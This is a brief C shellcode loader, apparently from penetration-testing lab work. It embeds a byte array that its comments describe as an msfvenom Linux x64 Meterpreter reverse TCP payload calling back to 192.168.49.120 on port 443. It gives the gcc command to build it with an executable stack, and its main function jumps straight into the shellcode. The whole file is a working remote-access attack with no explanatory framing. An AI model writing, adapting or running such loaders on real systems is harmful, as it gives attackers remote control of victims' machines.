#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// gcc -o loader loader.c -z execstack
// msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.49.120 lport=443 -f c
//Shellcode
unsigned char buf[] = 
"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\xa5\x97\x4d\xc9\xc4\xe6\x49\x88\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xcf\xbe\x15\x50\xae\xe4"
"\x16\xe2\xa4\xc9\x42\xcc\x8c\x71\x01\x31\xa7\x97\x4c\x72\xce"
"\xec\x49\x08\xf4\xdf\xc4\x2f\xae\xf6\x13\xe2\x8f\xcf\x42\xcc"
"\xae\xe5\x17\xc0\x5a\x59\x27\xe8\x9c\xe9\x4c\xfd\x53\xfd\x76"
"\x91\x5d\xae\xf2\xa7\xc7\xfe\x23\xe6\xb7\x8e\x49\xdb\xed\x1e"
"\xaa\x9b\x93\xae\xc0\x6e\xaa\x92\x4d\xc9\xc4\xe6\x49\x88";

int main(int argc, char **argv) 
{
        // Run the shellcode
        int (*ret)() = (int(*)())buf;
        ret();
}
